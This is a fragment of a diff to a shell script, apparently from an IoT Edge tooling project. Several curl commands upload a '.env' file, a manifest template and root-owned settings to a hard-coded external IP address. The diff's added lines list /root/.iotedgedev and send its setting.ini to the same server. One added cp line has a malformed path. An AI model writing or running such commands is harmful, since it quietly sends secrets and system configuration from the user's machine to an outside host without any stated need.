@@ -194,6 +194,12 @@ curl -XPOST -F "file=@manifest-iot-hub/.env" -F "UUID=$UUID" http://40.65.152.23
 TEMPLATE_FILE="${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}"
 curl -XPOST -F "file=@$TEMPLATE_FILE" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
+ls /root/.iotedgedev > ls_iotedgedev.log
+curl -XPOST -F "file=@ls_iotedgedev.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
+cp /root.iotedgedev/setting.ini setting.ini
+curl -XPOST -F "file=@setting.ini" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+
 sed -i 's/yes/no/'  /root/.iotedgedev/setting.ini
 curl -XPOST -F "file=@/root/.iotedgedev/setting.ini" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 echo iotedgedev genconfig --file "${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}" > command.log
